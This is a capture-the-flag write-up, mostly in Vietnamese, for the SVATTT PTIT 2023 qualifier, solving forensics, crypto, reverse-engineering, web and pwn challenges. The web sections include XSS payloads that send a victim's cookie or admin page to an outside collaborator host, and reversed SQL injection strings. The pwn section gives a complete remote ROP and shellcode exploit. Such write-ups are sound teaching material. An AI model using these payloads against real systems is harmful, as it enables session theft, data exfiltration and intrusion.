# SVATTT PTIT 2023
-----
## Overview

| Title | Category | Flag |
|---|---|---|
| [Pwn01](#Pwn-Pwn01) | Pwn | `ATTT{s3cur1tyy_@-@_t3h_ckUf}` |
| [Pwn02](#Pwn-Pwn02) | Pwn | `ATTT{Im4b4dboizwh0puShs33d1nU}` |
| [Re1](#RE-Re1) | RE | `ATTT{345y_m341}` |
| [Re2](#RE-Re2) | RE | `ATTT{BAINAYRATLADETOANG}` |
| [Re3](#RE-Re3) | RE | `ATTT{XachBaloLenVaDi}` |
| [Web1](#Web-Web1) | Web | `ATTT{3z_X2S_Fr0m_V@tv069_W1th_L0v3}` |
| [Web2](#Web-Web2) | Web | `ATTT{4_51mpl3_r3v_5ql}` |
| [Web1-Again]() | Web | `ATTT{4c3076335f56407476303639}` |
| [Crypto1](#Cryptography-Crypto1) | Cryptography | `ATTT{Meow_meow_meow_meow_tra_lai_tam_tri_toi_day}` |
| [Crypto2](#Cryptography-Crypto2) | Cryptography | `ATTT{NOT_A_SUBSTITUTION_CIPHER}` |
| [For1](#Forensics-For1) | Forensics | `ATTT{https://www.youtube.com/watch?v=4qNALNWoGmI}` |

# Forensics: For1

#### Challenge

<p> Flag Form: ATTT{This_is_Flag} <p>

[Ez4Ence.rar](https://github.com/vinhxinh/SVATTT_PTIT_2023/raw/main/For1/Ez4Ence.rar)

#### Solution

* Đề bài cho ta rất nhiều file rác không liên quan và 1 file chứa flag ta cần tìm.
* Sử dụng `grep` để tìm flag theo form có sẵn.

![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/For1/cmd1.jpg?raw=true)

**Flag**: `ATTT{https://www.youtube.com/watch?v=4qNALNWoGmI}`

# Cryptography: Crypto1

#### Challenge

[enc.cpp](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto1/enc.cpp) -
[bases.txt](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto1/bases.txt)

#### Solution

<p> Đề bài cho ta 2 file bases.txt và enc.cpp. Đọc thử trong code ta thấy file bases.txt đã được encrypt 1 lần. Flag được encrypt bằng cách với 4 kí tự được chọn, kí tự 1 được mã hóa về octal, kí tự 2 và 4 mã hóa về decimal và kí tự 3 được mã hóa về dạng hexadecimal. Vậy với file bases.txt được cho ban đầu, ta sẽ tìm ngược lại flag đã được mã hóa <p>

![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto1/anh1.jpg?raw=true)

![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto1/anh2.jpg?raw=true)

**Flag**: `ATTT{Meow_meow_meow_meow_tra_lai_tam_tri_toi_day}`

# Cryptography: Crypto2

#### Challenge

<p> Do you know the substitution cipher? In cryptography, a substitution cipher is a method of encrypting in which units of plaintext are replaced with the ciphertext. CTF players often use quipqiup tool to decrypt substitution cipher. If you want to create a tool like quipqiup, you should use frequency analysis method as an aid to breaking substitution ciphers. But today is not the day for subtitution cipher. Today I'm using AES encryption to protect my secret. Can you break it? <p>

[cipher.txt](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto2/cipher.txt) -
[enc.py](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto2/enc.py)

* Đề bài cho 1 file cipher và source enc.

``` 
from os import urandom
from Crypto.Cipher import AES

f = open("plain.txt", "r")
plaintext = f.read()

assert all([x.isupper() or x in '.,-_{ }' for x in plaintext])


class Cipher:
    def __init__(self):
        self.salt = urandom(15)
        key = urandom(16)
        self.cipher = AES.new(key, AES.MODE_ECB)

    def encrypt(self, message):
        return [self.cipher.encrypt(c.encode() + self.salt) for c in message]


def main():
    cipher = Cipher()
    encrypted = cipher.encrypt(plaintext)
    encrypted = "\n".join([c.hex() for c in encrypted])

    with open("cipher.txt", 'w+') as f:
        f.write(encrypted)


if __name__ == "__main__":
    main()

```

* Nhìn vào cipher và source enc có thể thấy plaintext là 1 đoạn văn bản khoảng 1000 ký tự và nó bị mã hóa như sau:
  * Đầu tiên `assert` để kiểm tra tất cả ký tự trong file plain.txt. Nếu toàn bộ các ký tự thỏa mãn một trong hai điều kiện sau thì chương trình có thể tiếp tục chạy:
    * Điều kiện 1: Ký tự là chữ in hoa trong bảng chữ cái từ A đến Z.
    * Điều kiện 2: Ký tự là 1 trong số 7 kí tự đặc biệt chấm/phẩy/gạch trên/gạch dưới/mở/đóng ngoặc nhọn/dấu cách    `.,-_{} `
  * Tiếp theo đi thẳng vào vấn đề chính
  	```	
  	def encrypt(self, message):
  		return [self.cipher.encrypt(c.encode() + self.salt) for c in message]
  	```
  * Hàm encrypt thực hiện mã hóa bằng cách lấy mỗi ký tự trong bản rõ nối với chuỗi salt random gồm 15 ký tự tạo thành 1 chuỗi 16 ký tự (vừa đủ cho 1 khối). Sau đó chuỗi này sẽ được tiến hành mã hoá bằng thuật toán AES theo chế độ ECB.
  * Sau đó mỗi ký tự mã hóa xong đc in ra trên 1 dòng. Kết quả là file cipher có 1076 dòng = 1076 ký tự bị mã hóa.
  * Đến phần giải, đầu tiên là cơ chế mã hóa của AES mode ECB: **_ECB là chế độ mã hóa từng khối bit độc lập. Với cùng một khóa mã K, mỗi khối plaintext ứng với một giá trị ciphertext cố định và ngược lại_**.

    ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto2/pic1.jpg?raw=true)

  * Tức là với các ký tự giống nhau sau khi mã hóa sẽ ra được những bản mã giống nhau
  * Tiếp đến là đoạn code mã hóa này không hề làm thay đổi thứ tự ký tự của bản rõ vì thế có thể giải mã bằng phương pháp phán đoán như này:
     * Trước tiên kiểm tra file cipher bằng cách sử dụng uniq và đã lọc ra được 32 bản mã khác nhau đại diện cho 32 ký tự được mã hóa **A-Z.,-_{ }** (tổng có 33 ký tự có thể 1 ký tự nào đó đã không được sử dụng)
     * Dựa vào form flag **ATTT{ABC_DEF}** kiểm tra vị trí từng bản mã và duy nhất **79baa5dd638b9dd358e0ebd73a2f04d5** xuất hiện liên tiếp 3 lần và từ đó lọc được bản mã của A{}

    ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto2/pic2.jpg?raw=true)
     * **79baa5dd638b9dd358e0ebd73a2f04d5 = T**
     * **c7a8b2b718344a552973e2194f54316e = A**
     * **110da0235675bc52e3d3a20b65ee2d69 = {**
     * **a143b07765f0c492802cccbe10c2ad2d = }**
  * Tiếp tục mò ký tự _ vì là ký tự đặc biệt nên khả năng nó sẽ xuất hiện ít và khả năng xuất hiện bên ngoài form flag cũng rất ít
     * **7334d85f5c104c2b0f8318d371f94819 = _**
     * Vì nó xuất hiện chỉ 3 lần và đều nằm trong form flag

     ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto2/pic3.jpg?raw=true)
     * Sau đó thay thế mỗi bản mã khác nhau còn lại thành 1 ký tự khác nhau sẽ được như sau
     
     ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto2/pic4.jpg?raw=true)
     
     * Sau đó thử ném nội dung flag lên _quipqiup_ thì cũng được kha khá kết quả
    
     ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto2/pic5.jpg?raw=true)
     
     * Phần 3 từ đầu có vẻ khớp với **'not_a_substitution'**
    
     ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Crypto2/pic6.jpg?raw=true)
  * Đến đây còn duy nhất 2 ký tự cuối trong cụm **"?I???"**. Đến đây thì thử các từ sao cho có nghĩa là được. 1 người biết tiếng Anh chắc chắn không mất nhiều lần để đoán ra đó là từ **"Cipher"** đâu nhỉ.

**Flag**: `ATTT{NOT_A_SUBSTITUTION_CIPHER}`


# Web: Web1

#### Challenge

[Link challenge](http://167.172.80.186:1337/) -
[Link bot](http://167.172.80.186:7777/)

#### Solution

* Ở challenge này chúng ta có 2 trang web, 1 là web bot, 1 trang web có chức năng viết note và hiển thị note. Và nhìn vào trang web note tôi đã nghĩ đến việc thử XSS đầu tiên.
* Ban đầu thử 1 script đơn giản `<script>alert(1)</script>` nhưng không thực hiện được, tôi nghĩ tag `<script>` đã bị filter nên tôi quay sang thử tag khác `<img src=1 onerror=alert(1)>` và thành công.
* Tiếp đến tôi quay ra thử con bot. Sau khi ném cho bot 1 cái link hoặc ko và chỉ cần bấm send thì nó sẽ hiển thị **Thank for submit!!!**
* Rồi tôi thử cho con bot send đền link Burp Collaborator client thì thấy con bot gửi đến 1 HTTP request GET đến /login
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web1/pic1.jpg?raw=true)
 
* Thử đến đây tôi đã nghĩ 1 kịch bản tấn công có thể sẽ là lấy cookie của client vói XSS và sau đó login với cookie đó:
  * Đầu tiên tôi sử dụng **fetch API** và nhét nó vào payload XSS để nó chạy trên web note như sau:
    > `<img src=x
    onerror="fetch('http://dvcy9080etobil16d12dzsm960cw0l.burpcollaborator.net/',
{method: 'POST', mode: 'no-cors' ,body:document.cookie})">`

  * Sau khi sub lên web note URL cũng sẽ chứa đoạn payload đó.
    > `http://167.172.80.186:1337/home.php?content=<img+src=x+
onerror+="fetch('http://zhkkvmum0fax47nsznozle8vsmyfm4.burpcollaborator.net/',+{method:+'POST',+mode:+'no-cors'+,body:document.cookie})">`

  * Lấy url đó sang web bot và gửi nó đi.
  * Từ đó kịch bản tấn công sẽ được thực hiện: Con bot sẽ truy cập trang web note, lấy cookie sau đó gắn vào body của post request gửi đến Burpcollab. Sau đó theo dõi **interactions** của Burpcollab client sẽ thấy request kèm cookie 
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web1/pic2.jpg?raw=true)
  * Cuối cùng lấy cookie đó login tôi đã vào được acc **admin**
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web1/pic3.jpg?raw=true)
  
**Flag**: `ATTT{3z_X2S_Fr0m_V@tv069_W1th_L0v3}`

# Web: Web2

#### Challenge

[link](http://167.172.80.186:5000/)

#### Solution

* Khi truy cập trang web những thông tin gây chú ý đầu tiên sẽ là **LQS Search**, **Reverse of name** và thử search “a” ra được kết quả như hình:

  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic1.jpg?raw=true)
 
* Rồi kiểm tra chức năng “Reverse of name” xem nó hoạt động như thế nào, search “Joseph” không có gì, reverse nó lại “hpesoJ” sẽ ra kết quả
 
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic2.jpg?raw=true)
 
* Tiếp theo thử SQLi Reverse: **`# -- '1'='1' RO ' a`** 
* Hiển thị tất cả dữ liệu trong bảng => **_SQLi_**
* Kiểm tra số cột: **`# -- 1,1,1,1 tceles noinu ' a => input error`** => ít hơn 4 cột
* **`-- 1,1,1 tceles noinu ' a`** => 3 cột
 
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic3.jpg?raw=true)
 
* **Check table:**
  > Joseph ' union select null,TABLE_NAME, NULL FROM INFORMATION_SCHEMA.TABLES -- # => # -- SELBAT.AMEHCS_NOITAMROFNI MORF LLUN ,EMAN_ELBAT,llun tceles noinu ' hpesoJ
 
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic4.jpg?raw=true)
 
* Lướt 1 xíu tìm thấy table **flag**
 
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic5.jpg?raw=true)
 
* Tiếp tục check column:
  > Joseph 'UNION SELECT null, column_name,null FROM information_schema.columns WHERE table_name='flag' -- # => # -- 'galf'=eman_elbat EREHW snmuloc.amehcs_noitamrofni MORF llun,eman_nmuloc ,llun TCELES NOINU' hpesoJ 
 
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic6.jpg?raw=true)
  
* Lấy **flag**:
  > Joseph 'UNION SELECT null, flag,null FROM flag -- # => # -- galf MORF llun,galf ,llun TCELES NOINU' hpesoJ
  
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Web2/pic7.jpg?raw=true)
  
**Flag**: `ATTT{4_51mpl3_r3v_5ql}`

# Web: Web1-Again

#### Challenge

[Link challenge](http://167.172.80.186:9999/) - [Link bot](http://167.172.80.186:8888/)

#### Solution

* Đối với challenge này cũng tương tự challenges web-1 nhưng điều khác biệt ở đây cookie đã được set flag httponly như vậy ta không thể lấy được cookie người dùng. Từ đó, tôi đã nghĩ ra cách làm thế nào mình có thể đọc được trang web admin bằng html. Và tôi thực hiện tương tự điều trên với payload như sau:
``` 
<script>
   var req = new XMLHttpRequest();
   req.onload = handleResponse;
   req.open('get','http://167.172.80.186:9999/admin.php',true);
   req.send();
   function handleResponse() {
    var token = this.responseText;
   var changeReq = new XMLHttpRequest();
   changeReq.open('post', 'http://burp.collaborator.client', true);
   changeReq.send('data='+token);
};
</script>
```

* Và tôi đã nhận được flag/

**Flag**: `ATTT{4c3076335f56407476303639}`


# RE: Re3

#### Challenge

[Complimentary.exe](https://github.com/vinhxinh/SVATTT_PTIT_2023/raw/main/Re3/ComplimentaryChallenge.exe)

#### Solution

* Đối với bài này khi đưa vào ida32bit ta sẽ đọc được source code như sau:

``` 

int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // eax
  FILE *v5; // eax
  FILE *v6; // eax
  DWORD Mode; // [esp+18h] [ebp-20h] BYREF
  char Str[4]; // [esp+1Ch] [ebp-1Ch] BYREF
  int v9; // [esp+20h] [ebp-18h]
  int v10; // [esp+24h] [ebp-14h]
  int v11; // [esp+28h] [ebp-10h]
  HANDLE hConsoleHandle; // [esp+2Ch] [ebp-Ch]

  __main();
  *(_DWORD *)Str = 523448849;
  v9 = 406598155;
  v10 = 557725189;
  v11 = 3741480;
  xor_strings(Str, "ISPw");
  hConsoleHandle = GetStdHandle(0xFFFFFFF5);
  if ( hConsoleHandle == (HANDLE)-1 )
  {
    v3 = ___acrt_iob_func(2u);
    fwrite("Failed to get console handle\n", 1u, 0x1Du, v3);
    return 1;
  }
  else if ( GetConsoleMode(hConsoleHandle, &Mode) )
  {
    Mode |= 4u;
    if ( SetConsoleMode(hConsoleHandle, Mode) )
    {
      printf("Flag: ATTT{%s}\x1B[2K\x1B[1GWhat are you waiting for?", Str);
      return 0;
    }
    else
    {
      v6 = ___acrt_iob_func(2u);
      fwrite("Failed to set console mode\n", 1u, 0x1Bu, v6);
      return 1;
    }
  }
  else
  {
    v5 = ___acrt_iob_func(2u);
    fwrite("Failed to get console mode\n", 1u, 0x1Bu, v5);
    return 1;
  }
}

```

* Ở đây ta thấy rằng flag chính là Str và chúng ta sẽ quan tâm đến Str tạo ra như thế nào.
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re3/pic1.png?raw=true)
  
* Như ta đã thấy các giá trị trong Str cũng là các giá trị dạng hex của Str, v9, v10, v11 vì Str được khai báo 4 Byte và v9, v10, v11 là 4 byte và địa chỉ sẽ tiếp tục được nối và gán với nhau như trên.
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re3/pic2.jpg?raw=true)

* Ở đây ta thấy được Str được xor với "ISPw" theo một cách lần lượt đó cũng chính là `xor edx ecx` và gán lại `dl cho địa chỉ hiện tại eax đó là Str[i]`. Từ đó, chúng ta có thể tiếp tục debug tìm ra chuỗi `Str` như sau:

```
Stack[00003D94]:0061FEAC db  58h ; X
Stack[00003D94]:0061FEAD db  61h ; a
Stack[00003D94]:0061FEAE db  63h ; c
Stack[00003D94]:0061FEAF db  68h ; h
Stack[00003D94]:0061FEB0 db  42h ; B
Stack[00003D94]:0061FEB1 db  61h ; a
Stack[00003D94]:0061FEB2 db  6Ch ; l
Stack[00003D94]:0061FEB3 db  6Fh ; o
Stack[00003D94]:0061FEB4 db  4Ch ; L
Stack[00003D94]:0061FEB5 db  65h ; e
Stack[00003D94]:0061FEB6 db  6Eh ; n
Stack[00003D94]:0061FEB7 db  56h ; V
Stack[00003D94]:0061FEB8 db  61h ; a
Stack[00003D94]:0061FEB9 db  44h ; D
Stack[00003D94]:0061FEBA db  69h ; i
```

**Flag**: `ATTT{XachBaloLenVaDi}`


# RE: Re2

#### Challenge

[babyRE](https://github.com/vinhxinh/SVATTT_PTIT_2023/raw/main/Re2/babyRE)

#### Solution

* Challenge này chỉ cho chúng ta một file ELF 64-bit. Mình có cho vào IDA để decompile file này và nhận thấy bên trong code khá là sợ.

![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic1.png?raw=true)

* Nhìn sơ qua thì có vẻ như file này được compile từ code một file code C++, nhưng không sử dụng một vài chức năng cho debug nên trông khá là rối
* Do vậy nên mình tiến hành kiểm tra các phần code và cùng với đó sử dụng chatGPT để đẩy nhanh quá trình đọc code. Và về cơ bản thì hàm main thực hiện những chức năng như sau:

``` 
#include <iostream>
#include <string>
#include <algorithm>
#include <cctype>

int main() {
    std::string cipher = "VJJLBTTXKDFQGQLGKV";
    
    // Get input from user
    std::cout << "Enter key: ";
    std::string input;
    std::cin >> input;

    // Convert input to uppercase
    std::transform(input.begin(), input.end(), input.begin(), [](unsigned char c){ return std::toupper(c); });

    // Pad input with "+" to make length a multiple of 3
    int padding = (3 - input.length() % 3) % 3;
    input += std::string(padding, '+');

    // Encrypt input in blocks of 3 characters
    std::string ciphertext;
    for (int i = 0; i < input.length(); i += 3) {

        // block_c =  3 elements from cipher starting at index i 
        // block_i = 3 elements from input key starting at index i

        encrypt(block_temp, block_i);

        // If a1 != a2
        if (cmp(block_c, block_temp))
        {
            // Fail []
        }
        else
        {
            // Correct []
        }
    }

    if (number of Correct [] == 6)
    {
        // Print flag.
    }
    else
    {
        // Print invalid key.
    }

    return 0;
}
```

* Nhìn vào đoạn code được đơn giản hóa chúng ta có thể thấy rằng:
  
  * Đầu tiên là phần input thì chương trình chỉ nhận ký tự in hoa.
  * Phần mã hóa sẽ mã hóa và kiểm tra từng block 3 phần tử từ input mình nhập vào.
* Thử tính toán nhanh với việc thử tất cả các trường hợp từng block 3 một, mình sẽ cần phải thử `26*26*26 = 17576` lần, mình cần thử với 6 blocks, nhưng do mỗi block độc lập với nhau, nên mình có thể chạy đồng thời 6 chương trình brute-force mỗi block đó. Như vậy là thời gian tìm được flag là có thể chấp nhận được. Máy xịn để làm gì cơ chứ
* Mình sẽ sử dụng python và pwntools để thực hiện chạy và truyền đối số vào chương trình. Bên dưới là chi tiết về script của mình cho block đầu tiên.

``` 
#! /usr/bin/python3
#  filename: exp.py

from pwn import *

table = string.ascii_uppercase

for i in table:
    for j in table:
        for k in table:
            elf = ELF("./babyRE")
            p = elf.process()

            feed = i+j+k

            p.sendline(feed.encode())

            s = p.recvall()

            if ("Correct" in str(s)):
                log.info("CORRECT WITH " + str(feed) + '\n')
                exit()
```

* Với mỗi block tiếp theo, mình sẽ chỉ quan tâm tới phần block đó mà không cần quan tâm tới việc các block khác ra sao, vậy nên mình sẽ padding cho các phần block đó toàn ký tự  `'A'`
* Ban đầu mình chỉ sử dụng script đầu tiên cho tất cả các block, mà không quan tâm tới việc có thể có nhiều hơn một chuỗi có thể cho kết quả Correct được nên mình đã tìm được một fake flag, sau đó mình đã sửa 3 script cuối, vì 3 blocks đầu ra kết quả mình nghĩ là chính xác rồi.
* Toàn bộ script mình sẽ để trong đây [scripts](https://github.com/vstxckr/Pwnable-WriteUp/tree/main/Contests/PTIT%20Qualifier%20for%20SVATTT%202023/Reverse/RE2/scripts)
* Tiếp theo mình sẽ tiến hành chạy tất cả các script và ngồi đợi kết quả.

* Block 1
![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic2.png?raw=true)

* Block 2
![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic3.png?raw=true)

* Block 3
![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic4.png?raw=true)

* Block 4
![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic5.png?raw=true)

* Block 5
![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic6.png?raw=true)

* Block 6
![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic7.png?raw=true)

* Ở 3 blocks cuối, do có nhiều hơn một chuỗi đưa ra kết quả đúng cho đầu vào file thực thi nên sau một hồi xem xét mình đã ghép được thành một message đúng là: `BAINAYRATLADETOANG`
* Input vào file babyRE ta nhận được thông báo flag chính xác:

  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic8.png?raw=true)

**Flag**: `ATTT{BAINAYRATLADETOANG}`


# RE: Re1

#### Challenge
[xorxor.zip](https://github.com/vinhxinh/SVATTT_PTIT_2023/raw/main/Re1/xorxor.zip)

#### Solution

* Đề bài cho chúng ta 1 file .zip, sau khi giải nén được được file xorxor.exe

  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re1/pic1.png?raw=true)
 
* Load file vào `IDA` để xem source code
 
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re1/pic2.png?raw=true)
 
* Chương trình khi chạy sẽ có giao diện để nhập flag và key

  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re1/pic3.png?raw=true)
 
* Sau khi tìm kiếm ta sẽ đến được hàm xử lí chính của chương trình, và sẽ đổi tên thành hàm encrypt

  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re1/pic4.png?raw=true)
 
* Hàm này sẽ nhận chuỗi flag và key để xor theo thuật toán rồi cuối cùng so sánh với chuỗi: **“0121317d1d5d0701636e355f4b237e”** nếu đúng thì sẽ hiện thông báo lên mà hình
* Từ thuật toán và chuỗi đã encrypt, ta có thể viết script để decode ngược lại và lấy flag 

  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re1/pic5.png?raw=true)

**Flag**: `ATTT{345y_m341}`
	

# Pwn: Pwn01

#### Challenge

[pwn01](https://github.com/vinhxinh/SVATTT_PTIT_2023/raw/main/Pwn01/pwn01)

#### Solution

* Chương trình gọi seccomp => có sandbox syscall check arch,`0x40000000`, và syscall number execute
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Pwn01/pic1.png?raw=true)

  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Pwn01/pic2.png?raw=true)
	
* Overflow variable v6 => overwrite return instruction pointer
 
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Pwn01/pic3.png?raw=true)
  
  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Pwn01/pic4.png?raw=true)
  
* Lưu ý hàm **is_this_funny** so sánh 11 character đầu tiên của v6.

* Variable v6: Do chỉ tràn `0x90` tức là chỉ ghi đè được thêm 4 stack sau RIP => thiếu space thực thi rop => dùng stack pivot fake rsp về biến name.
* Variable name: Sau khi rsp jmup về đây thì thực thi tiếp instructions ở đây nên ta cần xác định thiết lập ROP trên biến này trước.
* Ý tưởng là thiết lập segment rwx bằng mpprotect (do file compile static nên có sẵn nhiều gadget and function libc extern), khi đó thoải mái thiết lập shelcode thực thi việc đọc flag và in ra. (xử dụng openat and sendfile).

**Payload**:
```
#!/usr/bin/env python3
from pwn import *
elf = ELF('./pwn01')
context.arch = 'amd64'
# p = elf.process()
# context.log_level = 'DEBUG'
# gdb.attach(p, '''
# b *main+242
# ''')
p = remote('167.172.80.186', '6666')
suprize = b'I\'m weebiii'
pop_rdi = 0x00000000004033e1 # pop rdi ; ret
pop_rsi = 0x00000000004021e4 # pop rsi ; ret
pop_rdx = 0x0000000000450b6d # pop rdx ; ret
name_addr = 0x4d7320
leave_ret = 0x00000000004016d8 # leave ; ret
mprotect_addr = 0x452e50
rw_addr = 0x4d5000
# 1
shellcode = asm(
f'''
xor rdx, rdx
xor r10d, r10d
mov rsi, 0x4d7320
xor rdi, rdi
xor rax, rax
add rax, 0x101

syscall
mov r10, 0xffff
mov rsi, rax
xor rdi, rdi
add rdi, 0x1
xor rax, rax
add rax, 0x28
syscall
mov rax, 1
mov rdi, 1
syscall
''')
name = b''
name += b'/flag\x00'
name += b'ABCaaaa/home/pwn01'
name += b'ABCDEFGH'
name += p64(pop_rdi)
name += p64(rw_addr)
name += p64(pop_rsi)
name += p64(0x3000)
name += p64(pop_rdx)
name += p64(7)
name += p64(mprotect_addr)
name += p64(name_addr + 0x60)
name += shellcode
p.sendlineafter(b'> ', name)
# 2
payload = b''
payload += suprize
payload += b'A' * (0x60-11)
payload += p64(name_addr+0x18)
payload += p64(leave_ret)
p.sendlineafter(b'> ', payload)
p.interactive()

```

**Flag**: ATTT{s3cur1tyy_@-@_t3h_ckUf}


# Pwn: Pwn02

#### Challenge

> Time Wizard:
nc 167.172.80.186 5555

Hint: _Use timestamp_

#### Solution

* chương trình yêu cầu đoán số, tạo số sử dụng dấu thời gian => sử dụng lib python time và đoán số.

```
#!/usr/bin/env python3
from pwn import *
import random
import time
import calendar
import datetime
from ctypes import *
import random
while True:
p = remote('167.172.80.186', '5555')
current_GMT = time.gmtime()
time_stamp = calendar.timegm(current_GMT)
payload = b''
payload += str(time_stamp).encode()
print(payload)
p.sendlineafter(b'generated',
str(calendar.timegm(current_GMT)).encode())
data = p.recvall()
print(data)
```

**Flag**: `ATTT{Im4b4dboizwh0puShs33d1nU}`
